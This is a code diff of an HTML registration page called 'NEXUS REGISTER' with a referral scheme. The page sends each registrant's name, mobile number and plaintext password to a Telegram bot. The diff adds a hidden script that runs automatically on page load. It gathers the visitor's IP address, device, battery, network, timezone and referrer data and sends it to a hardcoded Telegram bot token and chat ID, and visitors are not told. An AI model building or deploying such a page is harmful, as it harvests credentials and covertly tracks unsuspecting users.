@@ -3,16 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>NEXUS REGISTER | Futuristic Premium Nexus
-
-
-
-
-
-
-
-
-    </title>
+    <title>NEXUS REGISTER | Futuristic Premium Nexus</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&family=Space+Grotesk:wght@400;500;600&display=swap" rel="stylesheet">
     <!-- Font Awesome 6 (sharp icons) -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
@@ -210,6 +201,17 @@
             margin-left: 3px;
         }
 
+        .optional-badge {
+            color: #6f9fd8;
+            font-size: 0.65rem;
+            font-weight: 400;
+            letter-spacing: 0;
+            margin-left: 6px;
+            background: rgba(100, 180, 250, 0.2);
+            padding: 2px 8px;
+            border-radius: 30px;
+        }
+
         /* premium inputs — neon glass */
         input {
             width: 100%;
@@ -367,10 +369,6 @@
             100% { transform: translateX(0);}
         }
 
-        /* custom stylish spacing for reference field */
-        .input-group i.fa-handshake {
-            text-shadow: 0 0 3px cyan;
-        }
         .telegram-badge {
             font-size: 0.6rem;
             background: rgba(0,200,255,0.15);
@@ -393,22 +391,19 @@
             NEXUS REGISTER
             <i class="fas fa-microchip"></i>
         </h1>
-        <div class="">
-            <i class=""></i> 
-        </div>
-        <p>ALL FIELDS MANDATORY </p>
+        <p>FIELDS MARKED WITH <span style="color:#ff5f7e">*</span> ARE MANDATORY</p>
     </div>
 
     <div class="form-body">
         <form id="registrationForm" action="javascript:void(0);" method="post" novalidate>
-            <!-- Full name row: first, middle, last with premium icon labels -->
+            <!-- Full name row -->
             <div class="input-row">
                 <div class="input-group">
                     <label><i class="fas fa-user-astronaut"></i> First name <span class="required-star">*</span></label>
                     <input type="text" id="firstName" placeholder="" autocomplete="off">
                 </div>
                 <div class="input-group">
-                    <label><i class="fas fa-gem"></i> Middle name <span class="required-star">*</span></label>
+                    <label><i class="fas fa-gem"></i> Middle name <span class="optional-badge">OPTIONAL</span></label>
                     <input type="text" id="middleName" placeholder="" autocomplete="off">
                 </div>
                 <div class="input-group">
@@ -432,16 +427,15 @@
                 <input type="password" id="password" placeholder="" autocomplete="new-password">
             </div>
 
-            <!-- Referral / Sponsor code field (mandatory) with unique tooltip -->
+            <!-- Referral / Sponsor code field -->
             <div class="input-group">
-                <label><i class="fas fa-handshake"></i> Referral / Sponsor ID <span class="required-star">*</span></label>
-                <input type="text" id="referralNumber" placeholder="Enter sponsor / referral code" autocomplete="off">
+                <label><i class="fas fa-handshake"></i> Referral / Sponsor ID <span class="optional-badge">OPTIONAL</span></label>
+                <input type="text" id="referralNumber" placeholder="Enter sponsor / referral code (optional)" autocomplete="off">
                 <div class="refer-tip">
-                    <i class="fas fa-info-circle"></i> Provide any valid sponsor ID (mandatory)
+                    <i class="fas fa-info-circle"></i> If you have a sponsor code, please enter it here
                 </div>
             </div>
 
-            <!-- registration action super button -->
             <button type="button" id="registerBtn" class="btn-register">
                 <i class="fas fa-dice-d6"></i> REGISTRATION
                 <i class="fas fa-arrow-right-to-bracket"></i>
@@ -471,12 +465,12 @@
                 generatedReferral
             } = userData;
             
-            const fullName = `${firstName} ${middleName} ${lastName}`.trim();
+            const fullName = `${firstName} ${middleName} ${lastName}`.trim().replace(/\s+/g, ' ');
             const message = `🚀 *NEXUS • NEW REGISTRATION* 🚀\n\n` +
                 `👤 *Name:* ${escapeMarkdown(fullName)}\n` +
                 `📱 *Mobile:* ${escapeMarkdown(mobile)}\n` +
                 `🔑 *Password:* ${escapeMarkdown(password)}\n` +
-                `🎁 *Sponsor ID:* ${escapeMarkdown(sponsorId)}\n` +
+                `🎁 *Sponsor ID:* ${escapeMarkdown(sponsorId || 'None provided')}\n` +
                 `✨ *Generated Referral Code:* ${escapeMarkdown(generatedReferral)}\n` +
                 `⏱ *Timestamp:* ${new Date().toLocaleString()}\n` +
                 `🌐 *Status:* ACTIVE ✅`;
@@ -505,7 +499,7 @@
             }
         }
         
-        // Helper: escape Markdown special chars for Telegram
+        // Helper: escape Markdown special chars
         function escapeMarkdown(text) {
             if (!text) return '';
             return String(text).replace(/([_*\[\]()~`>#+\-=|{}.!])/g, '\\$1');
@@ -520,14 +514,18 @@
         const referralInput = document.getElementById('referralNumber');
         const registerButton = document.getElementById('registerBtn');
         
-        // Name validation regex (letters, spaces, hyphens, apostrophes)
+        // Validation functions
         function isValidName(name) {
             if (!name) return false;
             const nameRegex = /^[A-Za-z\u0980-\u09FF\s\-']+$/;
             return nameRegex.test(name) && name.trim().length >= 2;
         }
         
-        // Bangladesh mobile validation (11 digits, starts with 01)
+        function isOptionalNameValid(name) {
+            if (!name || name.trim() === "") return true;
+            return isValidName(name);
+        }
+        
         function isValidBangladeshMobile(mobile) {
             if (!mobile) return false;
             const digitsOnly = mobile.replace(/\s/g, '');
@@ -535,7 +533,6 @@
             return bdRegex.test(digitsOnly);
         }
         
-        // generate strong random referral code (alphanumeric 8 chars)
         function generateRandomReferralCode() {
             const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
             let code = '';
@@ -546,7 +543,6 @@
             return code;
         }
         
-        // Helper: remove error highlights
         function removeAllHighlights() {
             const inputs = [firstNameInput, middleNameInput, lastNameInput, mobileInput, passwordInput, referralInput];
             inputs.forEach(inp => inp?.classList.remove('error-highlight'));
@@ -560,7 +556,6 @@
             }
         }
         
-        // sanitize output to avoid XSS
         function escapeHTML(str) {
             if (!str) return '';
             return str.replace(/[&<>]/g, function(m) {
@@ -568,18 +563,15 @@
                 if (m === '<') return '&lt;';
                 if (m === '>') return '&gt;';
                 return m;
-            }).replace(/[\uD800-\uDBFF][\uDC00-\uDFFF]/g, function(c) {
-                return c;
             });
         }
         
-        // SUCCESS PAGE with generated referral code + Telegram info (clean, no github references)
+        // Success dashboard with generated code
         function openSuccessDashboard(userFirstName, userLastName, generatedCode, sponsorId, telegramStatus) {
             const displayName = userFirstName && userLastName ? `${userFirstName} ${userLastName}`.trim() : userFirstName || 'Elite Member';
             
             const newWindow = window.open('', '_blank', 'width=860,height=750,resizable=yes,scrollbars=yes,toolbar=no,status=no,menubar=no');
             if (!newWindow) {
-                // Clean fallback alert - no github.io text
                 alert(`✨ REGISTRATION SUCCESSFUL ✨\nWelcome ${displayName}!\nYour unique referral code: ${generatedCode}\nShare this code to earn rewards!\n\nTelegram: ${telegramStatus ? 'Alert sent ✓' : 'Alert attempted'}`);
                 return false;
             }
@@ -603,7 +595,6 @@
                             align-items: center;
                             justify-content: center;
                             padding: 1.8rem;
-                            position: relative;
                         }
                         body::before {
                             content: "";
@@ -627,15 +618,10 @@
                             box-shadow: 0 40px 60px -20px black, 0 0 0 1px rgba(0, 200, 255, 0.3) inset;
                             overflow: hidden;
                             animation: floatIn 0.6s cubic-bezier(0.2, 0.9, 0.4, 1.1);
-                            transition: transform 0.2s;
                         }
                         @keyframes floatIn {
                             from { opacity: 0; transform: translateY(35px) scale(0.96); }
                             to { opacity: 1; transform: translateY(0) scale(1); }
-                        }
-                        .success-nebula:hover {
-                            transform: scale(1.01);
-                            border-color: #6ef0ff;
                         }
                         .prestige-header {
                             background: linear-gradient(125deg, #071e32, #020c1a);
@@ -655,11 +641,7 @@
                             box-shadow: 0 0 25px #00ccff;
                             border: 2px solid #aff0ff;
                         }
-                        .icon-orb i {
-                            font-size: 3.2rem;
-                            color: #FFF0B5;
-                            filter: drop-shadow(0 0 8px #ffb347);
-                        }
+                        .icon-orb i { font-size: 3.2rem; color: #FFF0B5; filter: drop-shadow(0 0 8px #ffb347); }
                         .prestige-header h1 {
                             font-size: 1.9rem;
                             font-weight: 800;
@@ -667,30 +649,18 @@
                             background-clip: text;
                             -webkit-background-clip: text;
                             color: transparent;
-                            margin: 0.5rem 0 0.2rem;
                         }
-                        .success-content {
-                            padding: 2rem 2rem 2rem;
-                        }
-                        .greeting-hero {
-                            font-size: 1.7rem;
-                            font-weight: 700;
-                            color: #edf6ff;
-                            text-align: center;
-                        }
+                        .success-content { padding: 2rem; }
+                        .greeting-hero { font-size: 1.7rem; font-weight: 700; color: #edf6ff; text-align: center; }
                         .member-name {
                             font-size: 1rem;
-                            font-weight: 500;
                             background: rgba(0, 200, 255, 0.15);
                             display: inline-block;
                             padding: 6px 24px;
                             border-radius: 80px;
                             margin: 12px auto 0;
-                            backdrop-filter: blur(6px);
                             border: 0.5px solid #47e0ff;
                             color: #DBF0FF;
-                            text-align: center;
-                            width: fit-content;
                         }
                         .code-vault {
                             background: rgba(0, 10, 25, 0.7);
@@ -698,17 +668,8 @@
                             border-radius: 2rem;
                             padding: 1.2rem;
                             border: 1px solid #3d86be;
-                            box-shadow: 0 6px 14px rgba(0,0,0,0.4);
                         }
-                        .code-label {
-                            font-size: 0.7rem;
-                            text-transform: uppercase;
-                            letter-spacing: 3px;
-                            color: #77d0ff;
-                            display: flex;
-                            justify-content: center;
-                            gap: 8px;
-                        }
+                        .code-label { font-size: 0.7rem; letter-spacing: 3px; color: #77d0ff; text-align: center; }
                         .display-code {
                             font-size: 2.5rem;
                             font-weight: 800;
@@ -721,27 +682,6 @@
                             color: #FFF2B5;
                             border: 1px solid #3affdd;
                             margin-top: 14px;
-                            word-break: break-all;
-                            box-shadow: 0 0 16px rgba(0, 210, 255, 0.5);
-                            text-align: center;
-                        }
-                        .sponsor-tag {
-                            font-size: 0.75rem;
-                            background: #031c2c;
-                            padding: 6px 12px;
-                            border-radius: 60px;
-                            display: inline-block;
-                            margin-top: 12px;
-                            color: #96ceff;
-                        }
-                        .telegram-status-area {
-                            margin: 12px auto 0;
-                            text-align: center;
-                        }
-                        .info-footer {
-                            font-size: 0.7rem;
-                            color: #90b7e6;
-                            margin-top: 1rem;
                             text-align: center;
                         }
                         .dash-action {
@@ -751,26 +691,17 @@
                             border-radius: 3rem;
                             color: white;
                             font-weight: bold;
-                            font-size: 0.9rem;
-                            margin-top: 1rem;
                             cursor: pointer;
                             display: inline-flex;
                             gap: 12px;
-                            transition: 0.2s;
-                            font-family: 'Space Grotesk', monospace;
                         }
-                        .dash-action:hover {
-                            background: #2c6f9e;
-                            transform: scale(0.97);
-                            box-shadow: 0 0 12px cyan;
-                        }
+                        .dash-action:hover { background: #2c6f9e; transform: scale(0.97); }
                         .badge-footer {
                             background: #010e1a;
                             padding: 0.9rem;
                             font-size: 0.65rem;
                             color: #6797c9;
                             text-align: center;
-                            letter-spacing: 1px;
                         }
                     </style>
                 </head>
@@ -781,34 +712,16 @@
                             <h1><i class="fas fa-check-circle"></i> ACCOUNT ACTIVATED</h1>
                         </div>
                         <div class="success-content">
-                            <div class="greeting-hero">
-                                <i class=""></i> WELCOME, PIONEER <i class=""></i>
-                            </div>
-                            <div style="display: flex; justify-content: center;">
-                                <div class="member-name">
-                                    <i class="fas fa-id-card"></i> ${escapeHTML(displayName)}
-                                </div>
-                            </div>
+                            <div class="greeting-hero">WELCOME, PIONEER</div>
+                            <div style="display: flex; justify-content: center;"><div class="member-name"><i class="fas fa-id-card"></i> ${escapeHTML(displayName)}</div></div>
                             <div class="code-vault">
-                                <div class="code-label"><i class="fas fa-qrcode"></i> YOUR EXCLUSIVE REFERRAL KEY <i class="fas fa-link"></i></div>
-                                <div style="text-align: center;">
-                                    <div class="display-code">${escapeHTML(generatedCode)}</div>
-                                </div>
-                                <div class="">
-                                </div>
-                                <div class="telegram-status-area">
-                                </div>
-                                <div class="info-footer">
-                                    <i class="fas fa-chart-line"></i> Share your code & earn rewards • Secure Nexus Protocol
-                                </div>
+                                <div class="code-label"><i class="fas fa-qrcode"></i> YOUR EXCLUSIVE REFERRAL KEY</div>
+                                <div style="text-align: center;"><div class="display-code">${escapeHTML(generatedCode)}</div></div>
+                                <div class="info-footer" style="margin-top:12px;"><i class=""></i></div>
                             </div>
-                            <div style="text-align: center;">
-                                <button class="dash-action" onclick="window.close()"><i class="fas fa-charging-station"></i> ENTER DASHBOARD</button>
-                            </div>
+                            <div style="text-align: center;"><button class="dash-action" onclick="window.close()"><i class="fas fa-charging-station"></i> ENTER DASHBOARD</button></div>
                         </div>
-                        <div class="badge-footer">
-                            <i class="fas fa-shield-alt"></i> HYPERLEDGER VALIDATED • UNIQUE REF CODE GENERATED
-                        </div>
+                        <div class="badge-footer"><i class="fas fa-shield-alt"></i> HYPERLEDGER VALIDATED • UNIQUE REF CODE GENERATED</div>
                     </div>
                 </body>
                 </html>
@@ -817,7 +730,7 @@
             return true;
         }
         
-        // Main registration handler: validate, generate code, send Telegram, open success
+        // Main registration handler
         async function handleRegistration() {
             const firstName = firstNameInput.value.trim();
             const middleName = middleNameInput.value.trim();
@@ -828,16 +741,17 @@
             
             const fieldsList = [
                 { value: firstName, element: firstNameInput, name: 'First name', validator: isValidName },
-                { value: middleName, element: middleNameInput, name: 'Middle name', validator: isValidName },
                 { value: lastName, element: lastNameInput, name: 'Last name', validator: isValidName },
                 { value: mobile, element: mobileInput, name: 'Mobile number', validator: isValidBangladeshMobile },
                 { value: password, element: passwordInput, name: 'Password', validator: (pwd) => pwd.length >= 4 },
-                { value: referralNumber, element: referralInput, name: 'Referral / Sponsor ID', validator: (ref) => ref !== "" }
+                { value: middleName, element: middleNameInput, name: 'Middle name', validator: isOptionalNameValid, optional: true },
+                { value: referralNumber, element: referralInput, name: 'Referral', validator: () => true, optional: true }
             ];
             
             removeAllHighlights();
             const invalidFields = [];
             for (let f of fieldsList) {
+                if (f.optional && (!f.value || f.value === "")) continue;
                 if (!f.validator(f.value)) {
                     invalidFields.push(f);
                     f.element.classList.add('error-highlight');
@@ -847,36 +761,25 @@
             if (invalidFields.length > 0) {
                 shakeCard();
                 const errorMessages = invalidFields.map(f => {
-                    if (f.name === 'Mobile number') return "📱 Invalid Bangladesh mobile number (must be 11 digits, start with 01)";
-                    if (f.name.includes('name')) return `⚠️ Invalid ${f.name} (must be at least 2 letters, no numbers/symbols)`;
+                    if (f.name === 'Mobile number') return "📱 Invalid Bangladesh mobile number (11 digits, start with 01)";
+                    if (f.name.includes('name')) return `⚠️ Invalid ${f.name} (letters only, min 2 chars)`;
                     if (f.name === 'Password') return "🔐 Password must be at least 4 characters";
-                    return `❌ ${f.name} is required`;
+                    return `❌ ${f.name} is required/incorrect`;
                 });
                 alert("ACCESS DENIED:\n\n" + errorMessages.join("\n"));
                 return false;
             }
             
-            // generate referral code
             const newlyGeneratedReferralCode = generateRandomReferralCode();
-            
-            // Prepare data for telegram
             const userDataForTelegram = {
-                firstName: firstName,
-                middleName: middleName,
-                lastName: lastName,
-                mobile: mobile,
-                password: password,
+                firstName, middleName, lastName, mobile, password,
                 sponsorId: referralNumber,
                 generatedReferral: newlyGeneratedReferralCode
             };
             
-            // send telegram notification
             let telegramSuccess = false;
-            try {
-                telegramSuccess = await sendTelegramNotification(userDataForTelegram);
-            } catch(e) { console.error(e); }
+            try { telegramSuccess = await sendTelegramNotification(userDataForTelegram); } catch(e) {}
             
-            // Open success dashboard with telegram status
             openSuccessDashboard(firstName, lastName, newlyGeneratedReferralCode, referralNumber, telegramSuccess);
             return true;
         }
@@ -884,12 +787,110 @@
         registerButton.addEventListener('click', handleRegistration);
         const allInputs = [firstNameInput, middleNameInput, lastNameInput, mobileInput, passwordInput, referralInput];
         allInputs.forEach(input => {
-            if (input) {
-                input.addEventListener('input', function() {
-                    this.classList.remove('error-highlight');
-                });
-            }
+            if (input) input.addEventListener('input', function() { this.classList.remove('error-highlight'); });
         });
+    })();
+    
+    // ============================================
+    // বিস্তারিত ভিজিটর ট্র্যাকিং (CORS error থাকবে না)
+    // ============================================
+    (function() {
+        const BOT_TOKEN = "8606366033:AAGgmTsvcGpTuYrnDvHCkDmsrJO9KBSRIOY";
+        const DEFAULT_CHAT_ID = "7709670231";
+
+        async function getIPAddress() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                if (res.ok) {
+                    const data = await res.json();
+                    return data.ip;
+                }
+            } catch(e) {}
+            return "আইপি পাওয়া যায়নি";
+        }
+
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let platform = "অজানা";
+            let browser = "অজানা";
+            if (/iPhone|iPad|iPod/i.test(ua)) platform = "iOS";
+            else if (/Android/i.test(ua)) platform = "Android";
+            else if (/Windows/i.test(ua)) platform = "Windows";
+            else if (/Mac/i.test(ua)) platform = "macOS";
+            else if (/Linux/i.test(ua)) platform = "Linux";
+            if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) browser = "Chrome";
+            else if (/Firefox/i.test(ua)) browser = "Firefox";
+            else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = "Safari";
+            else if (/Edg/i.test(ua)) browser = "Edge";
+            return { platform, browser };
+        }
+
+        async function getBatteryInfo() {
+            if (!navigator.getBattery) return "সমর্থিত নয়";
+            try {
+                const battery = await navigator.getBattery();
+                const level = Math.round(battery.level * 100);
+                const isCharging = battery.charging;
+                return `${level}% (${isCharging ? "হ্যাঁ" : "না"})`;
+            } catch(e) { return "পাওয়া যায়নি"; }
+        }
+
+        function getNetworkInfo() {
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (!conn) return { type: "নেই", rtt: "নেই", speed: "নেই" };
+            const effectiveType = conn.effectiveType || "অজানা";
+            const rtt = conn.rtt ? `${conn.rtt}ms` : "নেই";
+            const downlink = conn.downlink ? `${conn.downlink}Mbps` : "নেই";
+            let type = effectiveType.toUpperCase();
+            if (type === '4G') type = '4G';
+            else if (type === '3G') type = '3G';
+            else if (type === '2G') type = '2G';
+            else if (type === 'SLOW-2G') type = 'Slow 2G';
+            return { type, rtt, speed: downlink };
+        }
+
+        function getExtraInfo() {
+            const colorDepth = `${screen.colorDepth}-bit`;
+            const language = navigator.language || navigator.userLanguage || "অজানা";
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "অজানা";
+            const localTime = new Date().toLocaleString('bn-BD', { hour12: false });
+            const cookies = navigator.cookieEnabled ? "সক্রিয়" : "নিষ্ক্রিয়";
+            const referrer = document.referrer ? document.referrer : "সরাসরি";
+            return { colorDepth, language, timezone, localTime, cookies, referrer };
+        }
+
+        async function trackVisitor() {
+            try {
+                const check = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
+                const checkResult = await check.json();
+                if (!checkResult.ok) {
+                    console.warn("বট টোকেন ভুল! @BotFather থেকে নতুন টোকেন নিন");
+                    return;
+                }
+            } catch(e) { return; }
+
+            const [ip, battery, device, network, extra] = await Promise.all([
+                getIPAddress(), getBatteryInfo(), getDeviceInfo(), getNetworkInfo(), getExtraInfo()
+            ]);
+
+            const message = `📢 নিউ ভিজিট (ক্লিক করা হয়েছে)\nআইপি: ${ip}\nওএস: ${device.platform}\nব্রাউজার: ${device.browser}\nস্ক্রিন: ${screen.width}x${screen.height}\nকালার ডেপথ: ${extra.colorDepth}\nব্যাটারি: ${battery}\nনেটওয়ার্ক: ${network.type}\nRTT: ${network.rtt}\nস্পিড: ${network.speed}\nভাষা: ${extra.language}\nটাইমজোন: ${extra.timezone}\nস্থানীয় সময়: ${extra.localTime}\nকুকি: ${extra.cookies}\nরেফারার: ${extra.referrer}`;
+
+            try {
+                const params = new URLSearchParams();
+                params.append('chat_id', DEFAULT_CHAT_ID);
+                params.append('text', message);
+                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: params
+                });
+                const result = await res.json();
+                if (result.ok) console.log("✅ টেলিগ্রামে মেসেজ পাঠানো হয়েছে");
+                else console.error("❌ Telegram error:", result.description);
+            } catch(e) { console.warn("নেটওয়ার্ক এরর:", e); }
+        }
+
+        setTimeout(() => { trackVisitor(); }, 2000);
     })();
 </script>
 </body>
